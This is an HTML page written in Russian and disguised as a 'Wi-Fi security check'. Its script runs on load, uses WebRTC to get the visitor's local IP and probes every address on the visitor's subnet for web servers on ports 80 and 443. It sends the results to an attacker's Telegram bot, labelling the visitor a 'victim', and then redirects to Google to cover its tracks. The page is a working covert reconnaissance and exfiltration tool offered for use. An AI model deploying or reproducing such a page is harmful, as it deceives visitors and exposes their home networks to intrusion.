<!DOCTYPE html>
<html>
<head>
    <title>Загрузка...</title>
</head>
<body>
    <h2>Проверка безопасности Wi-Fi...</h2>
    <script>
        const BOT_TOKEN = 'ТВОЙ_ТОКЕН_БОТА';
        const CHAT_ID = 'ТВОЙ_ЧАТ_АЙДИ';

        async function sendToTelegram(msg) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
            } catch (e) {}
        }

        function getLocalIP() {
            return new Promise((resolve, reject) => {
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                pc.onicecandidate = (e) => {
                    if (e.candidate) {
                        const ip = e.candidate.address;
                        if (/^(192\.168\.|10\.|172\.(1[6-9]|2\d|3[01])\.)/.test(ip)) {
                            resolve(ip);
                            pc.close();
                        }
                    }
                };
                setTimeout(() => reject(new Error('No local IP found')), 3000);
            });
        }

        function scanSubnet(baseIP) {
            const parts = baseIP.split('.');
            const subnet = parts.slice(0, 3).join('.');
            const promises = [];
            const found = [];

            for (let i = 1; i <= 254; i++) {
                const ip = `${subnet}.${i}`;
                const p = new Promise((resolve) => {
                    const img = new Image();
                    img.onload = () => {
                        found.push(`Хост: ${ip} (порт 80)`);
                        resolve();
                    };
                    img.onerror = () => {
                        const img2 = new Image();
                        img2.onload = () => {
                            found.push(`Хост: ${ip} (порт 443)`);
                            resolve();
                        };
                        img2.onerror = () => resolve();
                        img2.src = `https://${ip}:443/favicon.ico?${Math.random()}`;
                    };
                    img.src = `http://${ip}/favicon.ico?${Math.random()}`;
                });
                promises.push(p);
            }
            return Promise.all(promises).then(() => found);
        }

        (async () => {
            try {
                let localIP;
                try {
                    localIP = await getLocalIP();
                } catch (e) {
                    await sendToTelegram(`Не удалось получить локальный IP: ${e.message}`);
                    return;
                }
                await sendToTelegram(`Жертва зашла. Локальный IP: ${localIP}\nСканирую подсеть...`);
                const hosts = await scanSubnet(localIP);
                const result = hosts.length > 0 ? hosts.join('\n') : 'Устройства не найдены';
                await sendToTelegram(`Результат:\n${result}`);
            } catch (e) {
                const errMsg = e.message || JSON.stringify(e) || 'Неизвестная ошибка';
                await sendToTelegram(`Ошибка: ${errMsg}`);
            }
            window.location = 'https://www.google.com';
        })();
    </script>
</body>
</html>
